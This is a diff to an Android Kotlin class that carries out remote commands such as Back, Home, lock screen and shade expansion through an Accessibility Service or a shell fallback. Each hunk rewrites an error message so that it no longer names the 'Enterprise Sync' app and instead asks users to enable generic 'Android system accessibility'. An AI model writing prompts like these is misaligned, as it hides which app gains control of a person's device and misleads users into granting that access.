@@ -146,7 +146,7 @@ class RemoteCommandManager(private val context: Context) {
                             resultMessage = if (isAccEnabled) "Executed Back gesture via system shell fallback." else "Executed Back gesture via shell fallback (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = if (isAccEnabled) "Failed to execute Back gesture: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to execute Back gesture: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                            resultMessage = if (isAccEnabled) "Failed to execute Back gesture: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to execute Back gesture: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                         }
                     }
                 }
@@ -170,7 +170,7 @@ class RemoteCommandManager(private val context: Context) {
                             resultMessage = if (isAccEnabled) "Executed Home action via system intent launcher." else "Executed Home action via system intent launcher (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = if (isAccEnabled) "Failed to execute Home gesture: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to execute Home gesture: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                            resultMessage = if (isAccEnabled) "Failed to execute Home gesture: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to execute Home gesture: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                         }
                     }
                 }
@@ -191,7 +191,7 @@ class RemoteCommandManager(private val context: Context) {
                             resultMessage = if (isAccEnabled) "Opened Recents via system shell fallback." else "Opened Recents via shell fallback (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = if (isAccEnabled) "Failed to open Recents: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to open Recents: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                            resultMessage = if (isAccEnabled) "Failed to open Recents: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to open Recents: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                         }
                     }
                 }
@@ -218,7 +218,7 @@ class RemoteCommandManager(private val context: Context) {
                             resultMessage = if (isAccEnabled) "Expanded Notification shade via system statusbar fallback." else "Expanded Notification shade via shell fallback (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = if (isAccEnabled) "Failed to expand Notifications: Accessibility Service is enabled, but system blocked shade expansion (e.g. screen locked or keyguard active)." else "Failed to expand Notifications: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                            resultMessage = if (isAccEnabled) "Failed to expand Notifications: Accessibility Service is enabled, but system blocked shade expansion (e.g. screen locked or keyguard active)." else "Failed to expand Notifications: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                         }
                     }
                 }
@@ -245,7 +245,7 @@ class RemoteCommandManager(private val context: Context) {
                             resultMessage = if (isAccEnabled) "Expanded Quick Settings via system statusbar fallback." else "Expanded Quick Settings via shell fallback (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = if (isAccEnabled) "Failed to expand Quick Settings: Accessibility Service is enabled, but system blocked shade expansion." else "Failed to expand Quick Settings: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                            resultMessage = if (isAccEnabled) "Failed to expand Quick Settings: Accessibility Service is enabled, but system blocked shade expansion." else "Failed to expand Quick Settings: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                         }
                     }
                 }
@@ -294,7 +294,7 @@ class RemoteCommandManager(private val context: Context) {
                         resultMessage = "Locked device screen successfully via $lockMethod."
                     } else if (!isAccEnabled) {
                         isSuccess = false
-                        resultMessage = "Failed to lock screen: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                        resultMessage = "Failed to lock screen: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                     } else {
                         isSuccess = false
                         resultMessage = "Failed to lock screen: Accessibility Service is enabled, but screen lock action was not supported by OS state."
